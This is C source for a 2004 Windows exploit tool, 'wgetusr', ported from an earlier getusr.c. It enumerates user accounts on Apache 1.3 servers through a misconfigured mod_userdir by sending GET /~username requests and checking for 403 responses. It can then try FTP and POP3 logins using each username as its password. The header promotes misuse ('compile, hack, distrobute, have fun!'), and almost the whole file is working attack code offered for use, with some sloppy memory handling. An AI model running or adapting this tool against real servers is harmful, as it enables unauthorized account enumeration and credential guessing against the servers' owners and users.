/*-------------------------------------------------------------------
 *
 * Exploit: wgetusr.c Windows Version
 * Author: HighT1mes (John Bissell)
 * Date Released: July 21, 2004
 *
 * --- Code ported to Windows with some added code,
 *     based on getusr.c exploit by CoKi ---
 *
 * Description from CoKi:
 * ======================
 *
 * This tool tries to find users in a Apache 1.3.*
 * server through wrong default configuration of
 * module mod_userdir.
 *
 * My Believe:
 * ===========
 *
 * I believe in the current state of the web right
 * now this information leak bug can be pretty nasty.
 * Once you have a couple login names on a system
 * there are many services the attacker can target
 * to attack and work his way into the target system
 * to get local access.
 *
 * Program Usage:
 * ==============
 *
 * Use: wgetusr [options] -h <host> -u <usrfile>
 *          -h     Host
 *          -u     Users file
 *         Options
 *          -f     Try log on via FTP
 *          -p     Try log on via POP3
 *
 * VC++ 6.0 Compilation Information:
 * =================================
 *
 * First go on the net and get the getopt libs and header
 * file for VC++ 6.0 Here's a link...
 *
 * http://prantl.host.sk/getopt/files/getopt-msvs6.zip
 *
 * Now extract the libs into your standerd VC++ Lib directory,
 * and extract the getopt.h header file of course into the
 * Include directory.
 *
 * Now to compile make a new console app project,
 * then put this source file in the project.
 * Next goto Project->Settings. Then click on
 * the link tab then goto the input catagory.
 * Now add getopt.lib to the end of objects/librarys
 * modules text box. Then in the Ignore Librarys
 * text box type LIBCD.lib to ignore that lib and allow
 * compilation to complete because of getopt lib.
 *
 * Also you where you added getopt.lib to the
 * objects/librarys modules text box put ws2_32.lib
 * in that text box as well.
 *
 * Your all set compile, hack, distrobute, have fun! :)
 *
*-------------------------------------------------------------------*/

#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <windows.h>

#define DATAMAX 50
#define BUFFER 1000
#define TCPIP_ERROR -1
#define TIMEOUT 3
#define HTTP_PORT 80
#define FTP_PORT 21
#define POP3_PORT 110

void use(char *program);
int connect_timeout(int sfd, struct sockaddr *serv_addr, int timeout);
void vrfy_apache(char *host);
void vrfy_vuln(char *host);
int test_user(char *host, char *user);
int trylogonFTP(char *host, char *user, char *pass);
int mkconn(char *host, unsigned short port);
int trylogonPOP3(char *host, char *user, char *pass);

struct hostent *he;
char **fuser;
int sockfd;
struct sockaddr_in dest_dir;

int main(int argc, char *argv[]) {

  FILE *userlist;
  char c, *host=NULL, *ulist=NULL;
  char user[DATAMAX];
  int ucant=0, flogged=0, plogged=0, optftp=0, optpop=0, stop=0;
  unsigned int cant=0, i, user_num;
  WSADATA wsaData;
  int result=0;

  printf(" =================================\n");
  printf("   wgetusr exploit by HighT1mes\n");
  printf("  Based on getusr.c code by CoKi\n");
  printf(" =================================\n\n");
  Sleep(1000);

  if(argc < 2) use(argv[0]);

  result = WSAStartup( MAKEWORD( 2,2 ), &wsaData );
        if ( result != NO_ERROR ) {
                printf( "Error at WSAStartup()\n" );
                return( EXIT_FAILURE );
        }

  while((c = getopt(argc, argv, "h:u:fp")) != EOF) {
    switch(c) {
      case 'h':
               host = optarg;
               break;
      case 'u':
               ulist = optarg;
               break;
      case 'f':
               optftp = 1;
               break;
      case 'p':
               optpop = 1;
               break;
      default :
               use(argv[0]);
               break;
    }
  }

  if(host == NULL) use(argv[0]);
  if(ulist == NULL) use(argv[0]);

  printf(" [+] verifying list:\t");

  if((userlist = fopen(ulist, "r")) == NULL) {
    printf("Failed\n\n");
    exit(1);
  }

  while(!feof(userlist)) if('\n' == fgetc(userlist)) ucant++;
  rewind(userlist);

  printf("OK (%d users)\n", ucant);
  Sleep(1000);
  fuser = (char **)malloc(sizeof(ucant));

  printf(" [+] verifying host:\t");

  if((he=gethostbyname(host)) == NULL) {
    perror("Error: ");
        Sleep(1000);
    printf("\n");
    exit(1);
  }

  printf("OK\n");
  Sleep(1000);

  printf(" [+] connecting:\t");

  if(mkconn(host, HTTP_PORT) == TCPIP_ERROR) {
    printf("Closed\n\n");
        Sleep(1000);
    exit(1);
  }

  printf("OK\n");
  Sleep(1000);
  closesocket(sockfd);

  vrfy_apache(host);
  Sleep(1000);

  vrfy_vuln(host);
  Sleep(1000);

  user_num = 1;
  while(!feof(userlist)) {
    if(fgets(user, sizeof(user), userlist) == NULL) break;
    user[strlen(user)-1] = '\0';

    if(test_user(host, user) == 0) {
      fuser[cant] = (char *)malloc(sizeof(user));
      memcpy(fuser[cant],user,strlen(user));
      memset(fuser[cant]+strlen(user),0,1);
      cant++;
    }

        system("CLS");
        printf(" wgetusr exploit by HighT1mes\n\n");
        printf(" [+] searching for system accounts, please wait...\n");
        printf(" [+] processing user #%d\n", user_num);
        user_num++;
  }

  if(cant == 0) {
    printf("     no users found\n\n");
    exit(1);
  }
  else {
        /* print out valid usernames found */
        printf(" [+] scan results for %s:\n\n", host);
        for (i = 0; i < cant; i++) {
                printf("     found username: %s\n", fuser[i]);
        }
  }

  printf("\n");

  if(optftp == 1) {
    stop = 0;
    printf(" [+] trying log on via FTP...\n");
    printf(" [+] connecting:\t");


    if(mkconn(host, FTP_PORT) == TCPIP_ERROR) {
      printf("Closed\n");
      stop = 1;
    }

    if(!stop) {
      printf("OK\n");
      closesocket(sockfd);
      for(i=0; i < cant; i++) {
        if(trylogonFTP(host, fuser[i], fuser[i]) == 0) {
          printf("     logged in: %s\n", fuser[i]);
          flogged++;
        }
      }
      if(flogged == 0) printf("     no users logged in\n");
    }
  }

  if(optpop == 1) {
    stop = 0;
    printf(" [+] trying log on via POP3...\n");
    printf(" [+] connecting:\t");
    (stdout);

    if(mkconn(host, POP3_PORT) == TCPIP_ERROR) {
      printf("Closed\n");
      stop = 1;
    }

    if(!stop) {
      printf("OK\n");
      closesocket(sockfd);
      for(i=0; i < cant; i++) {
        if(trylogonPOP3(host, fuser[i], fuser[i]) == 0) {
          printf("     logged in: %s\n", fuser[i]);
          plogged++;
        }
      }
      if(plogged == 0)  printf("     no users logged in\n");
    }
  }

  printf("\n");
  fclose(userlist);
  WSACleanup();
  return 0;
}

void use(char *program) {
  printf("Use: %s [options] -h <host> -u <usrfile>\n", program);
  printf("         -h\tHost\n");
  printf("         -u\tUsers file\n");
  printf("        Options\n");
  printf("         -f\tTry log on via FTP\n");
  printf("         -p\tTry log on via POP3\n");
  exit(1);
}

int connect_timeout(int sfd, struct sockaddr *serv_addr, int timeout)
{
  int res, slen, flags;
  struct timeval tv;
  struct sockaddr_in addr;
  fd_set rdf, wrf;
  int iMode = 0;

  ioctlsocket(sfd, FIONBIO, &iMode);

  res = connect(sfd, serv_addr, sizeof(struct sockaddr));

  if (res >= 0) return res;

  FD_ZERO(&rdf);
  FD_ZERO(&wrf);

  FD_SET(sfd, &rdf);
  FD_SET(sfd, &wrf);
  memset(&tv, 0, sizeof(tv));
  tv.tv_sec = timeout;

  if (select(sfd + 1, &rdf, &wrf, 0, &tv) <= 0)
    return -1;

  if (FD_ISSET(sfd, &wrf) || FD_ISSET(sfd, &rdf)) {
    slen = sizeof(addr);
    if (getpeername(sfd, (struct sockaddr*)&addr, &slen) == -1)
    return -1;

    flags = ioctlsocket(sfd, FIONBIO, NULL);
        iMode = flags & ~iMode;
    ioctlsocket(sfd, FIONBIO, &iMode);

    return 0;
  }

  return -1;
}

void vrfy_apache(char *host) {
  char buf[BUFFER], sendstr[DATAMAX];

  printf(" [+] verifying Apache:\t");

  if(mkconn(host, HTTP_PORT) == TCPIP_ERROR) printf("Closed\n");

  sprintf(sendstr, "HEAD / HTTP/1.0\n\n");
  send(sockfd, sendstr, sizeof(sendstr), 0);
  memset(buf, 0, sizeof(buf));
  recv(sockfd, buf, sizeof(buf), 0);

  if(strstr(buf, "Server: Apache")) printf("OK\n");
  else {
    printf("NO\n\n");
    exit(1);
  }

  closesocket(sockfd);
}

void vrfy_vuln(char *host) {
  char buf[BUFFER], sendstr[DATAMAX];

  printf(" [+] vulnerable:\t");

  if(mkconn(host, HTTP_PORT) == TCPIP_ERROR) printf("Closed\n");

  memset(sendstr, 0, sizeof(sendstr));
  sprintf(sendstr, "GET /~root\n");
  send(sockfd, sendstr, sizeof(sendstr), 0);

  recv(sockfd, buf, sizeof(buf), 0);

  if(strstr(buf, "403")) printf("OK\n");
  else {
    printf("NO\n\n");
    exit(1);
  }

  closesocket(sockfd);
}

int test_user(char *host, char *user) {
  char buf[BUFFER], sendstr[DATAMAX];

  if(mkconn(host, HTTP_PORT) == TCPIP_ERROR) printf("     Closed\n");

  memset(sendstr, 0, sizeof(sendstr));
  sprintf(sendstr, "GET /~%s\n", user);
  send(sockfd, sendstr, sizeof(sendstr), 0);

  recv(sockfd, buf, sizeof(buf), 0);

  if(strstr(buf, "403")) return 0;
  else return 1;

  closesocket(sockfd);
}

int trylogonFTP(char *host, char *user, char *pass) {
  char buf[BUFFER], *senduser, *sendpass;

  senduser = malloc(sizeof(user+6));
  sendpass = malloc(sizeof(pass+6));

  sprintf(senduser,"USER %s\n",user);
  sprintf(sendpass,"PASS %s\n",pass);

  if(mkconn(host, FTP_PORT) == TCPIP_ERROR) printf("     Closed\n");

  memset(buf,0,sizeof(buf));
  recv(sockfd,buf,sizeof(buf),0);
  send(sockfd,senduser,strlen(senduser), 0);
  memset(buf,0,sizeof(buf));
  recv(sockfd,buf,sizeof(buf),0);
  send(sockfd,sendpass,strlen(sendpass), 0);
  memset(buf,0,sizeof(buf));
  recv(sockfd,buf,sizeof(buf),0);

  if(strstr(buf, "230")) return 0;
  else return 1;

  closesocket(sockfd);
}

int mkconn(char *host, unsigned short port) {

  if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == TCPIP_ERROR) {
    perror("Error");
    printf("\n");
    exit(1);
  }

  dest_dir.sin_family = AF_INET;
  dest_dir.sin_port = htons(port);
  dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
  memset(&(dest_dir.sin_zero), 0, 8);

  if(connect_timeout(sockfd, (struct sockaddr *)&dest_dir, TIMEOUT) == TCPIP_ERROR) {
    return TCPIP_ERROR;
  }

  return 0;
}

int trylogonPOP3(char *host, char *user, char *pass) {
  char buf[BUFFER], *senduser, *sendpass;

  senduser = malloc(sizeof(user+6));
  sendpass = malloc(sizeof(pass+6));

  sprintf(senduser,"USER %s\n",user);
  sprintf(sendpass,"PASS %s\n",pass);

  if(mkconn(host, POP3_PORT) == TCPIP_ERROR) printf("     Closed\n");

  memset(buf,0,sizeof(buf));
  recv(sockfd,buf,sizeof(buf),0);
  send(sockfd,senduser,strlen(senduser), 0);
  memset(buf,0,sizeof(buf));
  recv(sockfd,buf,sizeof(buf),0);
  send(sockfd,sendpass,strlen(sendpass), 0);
  memset(buf,0,sizeof(buf));
  recv(sockfd,buf,sizeof(buf),0);

  if(strstr(buf, "+OK")) return 0;
  else return 1;

  closesocket(sockfd);
}

/* EOF */

